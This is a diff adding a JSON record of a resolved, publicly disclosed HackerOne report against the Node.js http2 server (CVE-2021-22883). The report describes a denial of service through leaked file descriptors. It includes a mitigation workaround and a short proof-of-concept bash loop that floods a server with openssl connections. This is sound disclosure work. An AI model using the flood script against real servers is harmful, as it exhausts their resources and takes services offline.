@@ -1,0 +1,130 @@
+{
+  "id": 1043360,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQzMzYw",
+  "url": "https://hackerone.com/reports/1043360",
+  "title": "HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-11-25T11:06:27.749Z",
+  "submitted_at": "2020-11-25T11:06:27.818Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "omicronenergy",
+    "url": "/omicronenergy",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22984,
+    "url": "https://hackerone.com/nodejs",
+    "handle": "nodejs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js",
+      "twitter_handle": "nodejs",
+      "website": "https://nodejs.org",
+      "about": "The Node.js JavaScript Runtime"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-22883"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-03-15T08:25:43.492Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-15T08:25:43.412Z",
+  "team_member_agreed_on_going_public_at": "2021-02-23T14:45:04.082Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nNode.js http2 server is vulnerable against denial of service attacks when too many connection attempts with an 'unknownProtocol' are established. This leads to a leak of file descriptors. If a file descriptor limit is configured on the system, then the server is unable to accept new connections and prevent the process also from opening, e.g. a file. If no file descriptor limit is configured, then this lead to an excessive memory usage and cause the system to run out of memory.\n\n**Description:**\nIf an attacker can establish an arbitrary amount of connections to the server and achieves that no session is instantiated by sending data causing the `unknownProtocol` event, then the socket is immediately closed by returning an error message.\n\nIf the attacker closes the socket before this can happen or simply do not respond to the response, the node process starts leaking file descriptors and the memory consumption increases dramatically. Node will wait for the response to the `unknownProtocol` message, which will never come.\n\nTo solve this issue we registered to the `unknownProtocol` event and had to implement two things:\n\n1. Call `socket.end()` without returning data, which seems to solve the problem partially. The amount of leaked file descriptors decreased dramatically but it is still leaking.\n2. Starting a timer and force a `socket.destroy()` after the timeout.\n\nOur current workaround for the problem looks like this:\n\n```\nserver.on('unknownProtocol', socket => {\n  // Install a timeout of 10 second if the socket was\n  // not successfully closed, then destroy the socket\n  // to ensure that the underlying resources are released.\n  const timer = setTimeout(() => {\n    if (!socket.destroyed) {\n      socket.destroy();\n    }\n  }, 10000);\n  // Un-reference the timer to avoid blocking\n  // of application shutdown and clear the timeout\n  // if the socket was successfully closed.\n  timer.unref();\n\n  // ATTENTION: Do not use the cb from the end call,\n  // because this also causes leaks!\n  socket.once('close', () => clearTimeout(timer));\n\n  // Try to gracefully close the socket\n  // ATTENTION: The default implementation provides an error\n  // message to the client, but if the client does not respond\n  // this causes the graceful close to fail. Therefore the\n  // socket is closed here without any message.\n  socket.end();\n});\n```\n\nOnce the node process reached the file descriptor limit of the system it is not possible to establish any new connection to the server. Next the process cannot not do any other operations that require a new file descriptor (e.g. opening a file). If the system has no file descriptor limit, then the process will continue consuming memory until the system has none left.\n\n## Steps To Reproduce:\n\nThe following steps assume you are on a linux system. Everything will run on your host system. The IP in the client is hard-coded to `127.0.0.1` and the port is `50000`. The scripts are kept as simple as possible. \n\n1. Create a file `client.sh` with the content provided in the Supporting Material section below (don't start it now)\n2. Create the Javascript file (see Supporting Material section below) and run the example server (may you want to customize the port). You can also start a non-secure server using `createServer()` if you don't have an example key or cert around.\n3. You query the file descriptors with the command provided in the Supporting Material section below. Simply replace `{PID}` with the process id of your node server.\n4. Maybe you also want to watch the memory consumption with the tool you prefer.\n5. Now you are ready to start the client script.\n\nWe initially found this issue by running the Greenbone Vulnerability Manager on our server port with the **OvenVAS default** scanner, the **Fast and ultimate** configuration with all kind of vulnerability tests enabled and the **TCP-SYN Service Ping** alive check.\n\nThe affected code that causes this issue seems to be [here](https://github.com/nodejs/node/blob/c0ac692ba786f235f9a4938f52eede751a6a73c9/lib/internal/http2/core.js#L2918-L2929).\n\nWe are running on Linux x86 with kernel v4.19.148 with node v12.19.0.\n\n## Impact:\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\n\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\n\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.\n\n## Supporting Material/References:\n\nclient.sh\n```\n#!/bin/bash\n\nrequest=\"GET / HTTP/1.1 Host: Anything\"\n\nwhile true;\ndo\n    echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &\ndone\n```\n\nJavascript File\n```\nconst http2 = require(\"http2\");\nconst fs = require(\"fs\");\n\nconst port = 50000;\n\nprocess.on('uncaughtException', error => {\n  console.log('An uncaught exception occurred:', error)\n});\n\nprocess.on('unhandledRejection', reason => {\n  console.log('An unhandled rejection occurred:', reason)\n});\n\nprocess.on('warning', warning => {\n  console.log('A process warning occurred:', warning)\n});\n\nfunction onRequest(req, res) {\n  console.log('got request')\n}\n\nconst serverOptions = {\n  key: fs.readFileSync(__dirname + \"/key.crt\"),\n  cert: fs.readFileSync(__dirname + \"/cert.crt\")\n};\n\nhttp2\n  .createSecureServer(serverOptions, onRequest)\n  .listen(port, () => {\n    console.log(\"http2 server started on port\", port);\n  })\n  .on('error', (err) => console.log(err))\n```\nQuery file descriptors command\n```\nls -l /proc/{PID}/fd | wc -l && ls -l /proc/{PID}/map_files | wc -l\n```\n\n\nIf you need anything else let us know.\n\n## Impact\n\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\n\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\n\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-03-25T14:45:04.449Z",
+  "allow_singular_disclosure_after": -161656214.05697072,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "salahhasoneh",
+    "demonia",
+    "makeg"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 666,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/nodejs/node",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
